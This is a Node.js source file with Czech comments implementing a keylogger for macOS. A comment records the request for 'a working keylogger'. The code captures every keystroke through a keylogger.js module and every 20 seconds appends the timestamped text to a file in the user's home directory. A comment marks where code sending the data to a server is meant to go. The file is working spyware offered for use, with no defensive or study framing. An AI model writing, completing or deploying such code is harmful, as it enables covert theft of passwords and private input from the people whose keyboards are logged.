//import keylogger from "keylogger.js";
// nebo
// prompt: potřebuji funkční keylogger v node.js který poběží na macos

const keylogger = require("keylogger.js");
const fs = require('fs');
const os = require('os');
const domovskyAdresar = os.homedir();
const cestaKsouboru = domovskyAdresar + '/keylog.txt';

// Vytvoření proměnné pro ukládání stisknutých kláves
let keystrokes = '';


keylogger.start((key, isKeyUp, keyCode) => {
  //console.log("keyboard event", key, isKeyUp, keyCode);

  if (isKeyUp) {
  	  if (key === "Spacebar") {
    		keystrokes += " ";
      }	else {
  			keystrokes += key;
      }
  }

});


setInterval(() => {
    if (keystrokes.length > 0) {
        // Nahrazení této části kódem, který odesílá data na server
        // Například pomocí AJAX nebo Fetch API
			  const now = new Date();
				var log = now.toLocaleString() + '| ' + keystrokes;

        if (!fs.existsSync(cestaKsouboru)) {
 			 console.log('Soubor neexistuje. Vytvářím nový soubor...');
		        fs.writeFile(cestaKsouboru, log, (err) => {
		  			if (err) {
		    			console.error('Chyba při zápisu do souboru:', err);
		  			} else {
		    			console.log('Hodnota byla úspěšně uložena do souboru.');
		  			}
				});

		} else {
			fs.appendFile(cestaKsouboru, log + '\n', (err) => {
  				if (err) {
    				console.error('Chyba při zápisu do souboru:', err);
  				} else {
    				console.log('Hodnota byla úspěšně přidána do souboru.');
  				}
		});

		}



        console.log('Stisknuté klávesy:', keystrokes);
        keystrokes = ''; // Vynulování řetězce
    }
}, 20000);
